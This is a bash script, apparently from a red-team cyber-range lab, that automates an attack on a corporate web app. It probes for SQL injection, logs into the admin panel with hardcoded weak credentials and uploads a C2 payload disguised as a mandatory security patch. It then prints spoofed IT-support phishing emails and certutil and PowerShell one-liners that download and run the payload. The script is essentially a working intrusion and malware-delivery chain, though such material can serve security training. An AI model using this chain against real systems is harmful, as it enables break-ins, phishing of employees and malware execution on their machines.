#!/bin/bash
#
# Exploit weak admin creds on the public web app and upload report.exe (from attack box) to /uploads/.
#
# Prerequisites: run attack_serve_c2_payload_for_web_phishing.sh (or attack_serve_c2_payload_over_http.sh)
#                first so /home/ubuntu/report.exe exists on the attack server.
#
set -e

REGION="${1:-apac}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=/dev/null
source "${SCRIPT_DIR}/attack_c2_helpers/runner_lib.sh"
c2_validate_framework

SSH_KEY="terraform/certs/project-responder-ssh"
ATTACK_USER="ubuntu"
PAYLOAD_NAME="report.exe"
DISGUISED_NAME="${2:-TSG-Mandatory-Security-Patch.exe}"
ADMIN_USER="admin"
ADMIN_PASS="tsg2025"

DETAILS_FILE="inventory/attack_server_details_${REGION}"
if [ ! -f "${DETAILS_FILE}" ]; then
    echo "[!] Details file not found: ${DETAILS_FILE}"
    echo "    Usage: $0 <region> [disguised_filename]"
    echo "    Example: $0 apac IT-Policy-Update-2026.exe"
    exit 1
fi

ATTACK_IP=$(awk '/^Linux Bastion Public IP:/ { print $5 }' "${DETAILS_FILE}")
FIREWALL_EIP=$(awk '/^Firewall EIP:/ { print $3 }' "${DETAILS_FILE}")

if [ -z "${ATTACK_IP}" ]; then
    echo "[!] Could not extract attack server IP from ${DETAILS_FILE}"
    exit 1
fi
if [ -z "${FIREWALL_EIP}" ]; then
    echo "[!] Could not extract firewall EIP from ${DETAILS_FILE}"
    exit 1
fi

SSH_OPTS="-i ${SSH_KEY} -o StrictHostKeyChecking=no"
WEB_URL="http://${FIREWALL_EIP}"

echo "============================================"
echo "  Upload C2 payload to corporate web /uploads/"
echo "============================================"
echo ""
echo "[*] Region:        ${REGION}"
echo "[*] Attack box:    ${ATTACK_IP}"
echo "[*] Firewall EIP:  ${FIREWALL_EIP}"
echo "[*] Target URL:    ${WEB_URL}"
echo "[*] Payload:       ${PAYLOAD_NAME} -> ${DISGUISED_NAME}"
echo ""

ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" bash -s <<REMOTE
set -e

WEB_URL="${WEB_URL}"
ADMIN_USER="${ADMIN_USER}"
ADMIN_PASS="${ADMIN_PASS}"
PAYLOAD="/home/ubuntu/${PAYLOAD_NAME}"
DISGUISED="${DISGUISED_NAME}"
FIREWALL_EIP="${FIREWALL_EIP}"
LHOST=\$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)

echo "=========================================="
echo "  Phase 1: Reconnaissance"
echo "=========================================="
echo ""

echo "[*] Probing web server at \${WEB_URL}..."
HTTP_CODE=\$(curl -s -o /dev/null -w "%{http_code}" "\${WEB_URL}/")
echo "[+] GET / -> HTTP \${HTTP_CODE}"

echo "[*] Checking for directory listing on /uploads/..."
UPLOADS_CODE=\$(curl -s -o /dev/null -w "%{http_code}" "\${WEB_URL}/uploads/")
echo "[+] GET /uploads/ -> HTTP \${UPLOADS_CODE}"
if [ "\${UPLOADS_CODE}" = "200" ]; then
    echo "[+] Directory listing ENABLED - files will be visible to all users"
fi

echo "[*] Probing admin panel at /admin/..."
ADMIN_CODE=\$(curl -s -o /dev/null -w "%{http_code}" "\${WEB_URL}/admin/")
echo "[+] GET /admin/ -> HTTP \${ADMIN_CODE} (401 = auth required)"

echo "[*] Checking for info disclosure at /phpinfo.php..."
PHPINFO_CODE=\$(curl -s -o /dev/null -w "%{http_code}" "\${WEB_URL}/phpinfo.php")
echo "[+] GET /phpinfo.php -> HTTP \${PHPINFO_CODE}"

echo "[*] Checking for SQL injection on /login.php..."
SQLI_TEST=\$(curl -s -X POST "\${WEB_URL}/login.php" -d "username=admin'--&password=x" | grep -c "Welcome back" || true)
if [ "\${SQLI_TEST}" -gt 0 ]; then
    echo "[+] SQL injection CONFIRMED on /login.php (auth bypass works)"
else
    echo "[-] SQL injection test inconclusive (login form present)"
fi

echo ""
echo "=========================================="
echo "  Phase 2: Admin login"
echo "=========================================="
echo ""

echo "[*] Attempting login to admin panel with \${ADMIN_USER}:\${ADMIN_PASS}..."
ADMIN_AUTH_CODE=\$(curl -s -o /dev/null -w "%{http_code}" -u "\${ADMIN_USER}:\${ADMIN_PASS}" "\${WEB_URL}/admin/")
if [ "\${ADMIN_AUTH_CODE}" = "200" ]; then
    echo "[+] Admin panel access GRANTED"
else
    echo "[!] Admin login failed (HTTP \${ADMIN_AUTH_CODE}). Aborting."
    exit 1
fi

echo "[*] Checking for document upload form at /admin/upload.php..."
UPLOAD_PAGE=\$(curl -s -u "\${ADMIN_USER}:\${ADMIN_PASS}" "\${WEB_URL}/admin/upload.php")
if echo "\${UPLOAD_PAGE}" | grep -q "enctype"; then
    echo "[+] File upload form FOUND at /admin/upload.php"
else
    echo "[!] No upload form found. Aborting."
    exit 1
fi

echo ""
echo "=========================================="
echo "  Phase 3: Upload to /uploads/"
echo "=========================================="
echo ""

if [ ! -f "\${PAYLOAD}" ]; then
    echo "[!] Payload not found at \${PAYLOAD}"
    echo "    Run ./scripts/attack_serve_c2_payload_for_web_phishing.sh ${REGION} first."
    exit 1
fi

echo "[*] Copying payload to disguised filename: \${DISGUISED}"
cp "\${PAYLOAD}" "/tmp/\${DISGUISED}"

echo "[*] Uploading \${DISGUISED} via admin upload form..."
UPLOAD_RESULT=\$(curl -s -u "\${ADMIN_USER}:\${ADMIN_PASS}" \
    -F "document=@/tmp/\${DISGUISED}" \
    "\${WEB_URL}/admin/upload.php")

if echo "\${UPLOAD_RESULT}" | grep -q "uploaded successfully"; then
    echo "[+] Payload uploaded successfully!"
else
    echo "[!] Upload may have failed. Check manually."
fi

echo "[*] Verifying payload is accessible..."
VERIFY_CODE=\$(curl -s -o /dev/null -w "%{http_code}" "\${WEB_URL}/uploads/\${DISGUISED}")
if [ "\${VERIFY_CODE}" = "200" ]; then
    echo "[+] Payload is live at: \${WEB_URL}/uploads/\${DISGUISED}"
else
    echo "[!] Verification returned HTTP \${VERIFY_CODE}"
fi

rm -f "/tmp/\${DISGUISED}"

PAYLOAD_URL_EXT="\${WEB_URL}/uploads/\${DISGUISED}"
PAYLOAD_URL_INT="http://web.tsg-internal.lab/uploads/\${DISGUISED}"

echo ""
echo "=========================================="
echo "  Phase 4: Delivery copy-paste"
echo "=========================================="
echo ""
echo "  External URL (from attack box): \${PAYLOAD_URL_EXT}"
echo "  Internal URL (from clients):    \${PAYLOAD_URL_INT}"
echo ""
echo "  --- Phishing emails (auto-clicked by ben/kate within 60s) ---"
echo ""
echo "  swaks --to ben@tsg-internal.lab --from it-support@tsg-internal.lab --server \${FIREWALL_EIP} --header 'Subject: ACTION REQUIRED: Mandatory Security Patch' --body 'All employees must install the latest security patch from the corporate portal: \${PAYLOAD_URL_INT}'"
echo ""
echo "  swaks --to kate@tsg-internal.lab --from it-support@tsg-internal.lab --server \${FIREWALL_EIP} --header 'Subject: ACTION REQUIRED: Mandatory Security Patch' --body 'All employees must install the latest security patch from the corporate portal: \${PAYLOAD_URL_INT}'"
echo ""
echo "  --- Manual download from target (CMD) ---"
echo ""
echo "  certutil -urlcache -split -f \${PAYLOAD_URL_INT} %TEMP%\\\${DISGUISED} && %TEMP%\\\${DISGUISED}"
echo ""
echo "  --- Manual download from target (PowerShell) ---"
echo ""
echo "  Invoke-WebRequest -Uri '\${PAYLOAD_URL_INT}' -OutFile \\\$env:TEMP\\\\\${DISGUISED}; Start-Process \\\$env:TEMP\\\\\${DISGUISED}"
echo ""
echo "=========================================="

REMOTE

echo ""
echo "[*] Upload complete. C2_FRAMEWORK=${C2_FRAMEWORK:-metasploit}"
if [[ "${C2_FRAMEWORK:-metasploit}" == "metasploit" ]]; then
  echo "    Reconnect to MSF:  ssh ${SSH_OPTS} -t ${ATTACK_USER}@${ATTACK_IP} tmux attach -t msf"
else
  echo "    Listener notes:     ssh ${SSH_OPTS} ${ATTACK_USER}@${ATTACK_IP} 'cat /home/ubuntu/listener.rc'"
fi
echo ""
